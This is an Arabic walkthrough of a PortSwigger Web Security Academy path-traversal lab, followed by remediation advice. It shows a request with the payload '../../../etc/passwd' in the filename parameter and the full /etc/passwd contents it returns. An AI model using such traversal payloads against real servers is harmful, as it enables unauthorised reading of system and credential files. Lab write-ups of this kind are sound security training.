# [File path traversal, simple case](https://portswigger.net/web-security/file-path-traversal/lab-simple)

## **`الهدف`**
الحصول على محتويات ملف `/etc/passwd`
## **`خطوات الحل`**
نقوم بالضغط على أي منتج لنفتح صفحته، ونعترض الـ `request` الثاني الخاص بفتح الصفحة والذي يحدث تلقائيًا
```http
GET /image?filename=18.jpg HTTP/2
Host: 0ad900c80386d6e0827438c400350071.web-security-academy.net
Cookie: session=G59JinmI2hdgvXNTuy58PJDkrekRTn9E
```

ونقوم بتغيير الجزئية الموجودة في أول سطر من `18.jpg` إلى `../../../etc/passwd` ونقوم بتمريره.
```http
GET /image?filename=../../../etc/passwd HTTP/2
Host: 0ad900c80386d6e0827438c400350071.web-security-academy.net
Cookie: session=G59JinmI2hdgvXNTuy58PJDkrekRTn9
```

**`ملاحظة إضافية:`** إذا فحصنا الـ `response` سنجد محتويات ملف `passwd`.
```http
HTTP/2 200 OK
Content-Type: image/jpeg
X-Frame-Options: SAMEORIGIN
Content-Length: 2316

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
systemd-timesync:x:103:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:104:105:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:105:106:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
mysql:x:106:107:MySQL Server,,,:/nonexistent:/bin/false
postgres:x:107:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:109:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
mongodb:x:110:117::/var/lib/mongodb:/usr/sbin/nologin
avahi:x:111:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:112:119:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
geoclue:x:113:120::/var/lib/geoclue:/usr/sbin/nologin
saned:x:114:122::/var/lib/saned:/usr/sbin/nologin
colord:x:115:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
pulse:x:116:124:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gdm:x:117:126:Gnome Display Manager:/var/lib/gdm3:/bin/false
```

وبعد ذلك نقوم بعمل `refresh` لصفحة الويب أو نضغط على زر `Home` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
يجب استخدام التعيين المباشر `Mapping/Indirect Reference` حيث بدلًا من السماح للمستخدم بتمرير اسم الملف بشكل مباشر في الرابط (مثل `filename=18.jpg`)، يتم تمرير مُعرف أو رقم فريد (مثل `id=18`)، ويقوم السيرفر بالبحث في قاعدة بيانات أو جدول داخلى ليرى أن الرقم `18` يقابل الملف `18.jpg` فيقوم بعرضه، وفي هذه الحالة لو أدخل المستخدم رقمًأ غير موجود أو حاول كتابة رموز فسيتم رفض الـ `request` لأنه لا يطابق أى مُعرف داخلي.

وإذا كان لابد من تمرير اسم الملف من خلال المستخدم فيجب تحديد `whitelist` بالصيغ والرموز المسموح بها فقط، حيث يتم ضبط النظام ليقبل فقط بالحروف الأبجدية، الأرقام، وامتدادات محددة مسبقاً (مثل `.png` أو `.jpg`)، ويتم رفض أى مدخل يحتوي على رموز خاصة مثل النقاط المزدوجة (`..`) أو الشرطات المائلة (`/` أو `\`) قبل أن يصل إلى وظائف نظام التشغيل.

يجب جعل النظام يقوم بتوحيد المسار أولًا، حيث يقوم النظام بتحويل المدخل إلى الـ `Absolute Path` (أي حل جميع رموز `../` لمعرفة أين سينتهي المسار فعلياً)، ويتم التحقق هل ينتهي فعلًا بمجلد الصور المسموح به، وإذا كان الجواب نعم فيتم السماح بقراءة الملف، وأما إذا كان يشير إلى أى مكان خارج المجلد المسموح به فيتم رفض الـ `request`

يجب على السيرفر والتطبيق ألا يعملوا بصلاحيات عالية `root أو administrator` بل يتم تشغيل الخدمة بحساب مستخدم عادي في نظام التشغيل، وتكون صلاحياته مقتصرة على القراءة من مجلد الصور المخصص، ويتم سحب أي صلاحية منه لقراءة ملفات النظام الحساسة، وبالتالي، حتى لو نجح المهاجم في تجاوز فلاتر التطبيق، سيرفض نظام التشغيل نفسه إعطاؤه الملف لعدم امتلاكه الصلاحية لقراءته.
